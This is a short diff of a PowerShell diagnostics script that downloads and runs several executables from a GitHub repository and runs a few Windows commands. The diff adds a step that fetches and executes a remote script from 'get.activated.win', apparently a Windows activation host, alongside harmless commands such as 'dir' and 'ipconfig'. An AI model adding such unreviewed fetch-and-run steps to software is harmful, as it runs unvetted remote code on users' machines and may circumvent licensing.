@@ -73,16 +73,25 @@ $urls = @(
     'https://github.com/Zigsaw07/Diagnostics/raw/main/BatteryInfoView.exe'
 )
 
+# URL of the remote script to execute
+$remoteScriptUrl = 'https://get.activated.win'
+
 # CMD commands to run
 $cmdCommands = @(
-    'start start microsoft.windows.camera:',
-    'start ms-settings:sound'    
+    'start microsoft.windows.camera:',
+    'start ms-settings:sound',
+    'echo Hello, World!',
+    'dir',
+    'ipconfig'
 )
 
 # Loop through each URL and execute the download and run function
 foreach ($url in $urls) {
     DownloadAndRun-Executable -url $url
 }
+
+# Execute the remote script
+Execute-RemoteScript -url $remoteScriptUrl
 
 # Loop through each CMD command and execute it
 foreach ($command in $cmdCommands) {
